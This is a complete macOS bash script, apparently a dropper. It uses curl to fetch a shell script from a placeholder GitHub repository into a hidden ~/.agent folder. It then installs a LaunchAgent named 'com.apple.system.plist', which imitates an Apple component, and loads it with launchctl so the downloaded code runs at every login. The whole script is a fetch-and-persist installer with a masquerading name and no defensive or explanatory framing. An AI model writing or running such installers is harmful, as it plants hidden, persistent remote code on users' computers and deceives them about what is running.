#!/bin/bash

AGENT_DIR="$HOME/.agent"
PLIST_NAME="com.apple.system.plist"
LAUNCH_AGENT="$HOME/Library/LaunchAgents/$PLIST_NAME"

mkdir -p "$AGENT_DIR"
curl -sL https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/system.sh -o "$AGENT_DIR/system.sh"
chmod +x "$AGENT_DIR/system.sh"

curl -sL https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/com.apple.system.plist -o "$LAUNCH_AGENT"
sed -i '' "s|/Users/\$(whoami)|$HOME|g" "$LAUNCH_AGENT"

launchctl load "$LAUNCH_AGENT"
